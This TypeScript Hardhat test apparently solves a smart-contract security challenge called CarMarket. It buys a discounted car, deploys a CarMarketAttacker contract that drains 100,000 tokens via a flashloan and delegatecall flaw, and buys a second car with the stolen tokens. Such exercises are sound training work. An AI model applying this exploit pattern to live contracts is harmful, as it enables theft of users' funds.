import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('CarMarket', () => {
  let token: Contract;
  let market: Contract;
  let factory: Contract;
  let attacker: SignerWithAddress;
  let attacker2: SignerWithAddress;
  let deployer: SignerWithAddress;
  before(async () => {
    [attacker, deployer, attacker2] = await ethers.getSigners();

    token = await (await ethers.getContractFactory('CarToken', deployer)).deploy();

    await token.deployed();

    market = await (await ethers.getContractFactory('CarMarket', deployer)).deploy(token.address);

    await market.deployed();

    factory = await (
      await ethers.getContractFactory('CarFactory', deployer)
    ).deploy(market.address, token.address);

    await factory.deployed();

    await (await market.setCarFactory(factory.address)).wait();

    await (await token.priviledgedMint(market.address, ethers.utils.parseEther('100000'))).wait();

    await (await token.priviledgedMint(factory.address, ethers.utils.parseEther('100000'))).wait();

    token = token.connect(attacker);
    market = market.connect(attacker);
    factory = factory.connect(attacker);
  });

  it('attack', async () => {
    let tx;

    // 1 - Buy the first car with discount
    // get free tokens
    await (await token.mint()).wait();

    // allow transfer to market
    await (await token.approve(market.address, ethers.utils.parseEther('1'))).wait();

    // buy first car with discount
    await (await market.purchaseCar('red', 'bmw', 'ASD123')).wait();

    expect((await market.getCarCount(attacker.address)).toNumber()).to.equal(1);

    // 2 - deploy attacker contract and execute a flashloan through delegatecall
    const attackerContract = await (
      await (await ethers.getContractFactory('CarMarketAttacker', attacker)).deploy()
    ).deployed();

    await (await attackerContract.attack(market.address, token.address)).wait();

    expect((await token.balanceOf(attacker.address)).eq(ethers.utils.parseEther('100000'))).to.be
      .true;

    // 3 - purchase a second car with stolen tokens
    await (await token.approve(market.address, ethers.utils.parseEther('100000'))).wait();

    await (await market.purchaseCar('blue', 'bmw', 'QWE222')).wait();

    expect((await market.getCarCount(attacker.address)).eq(2)).to.be.true;
  });
});
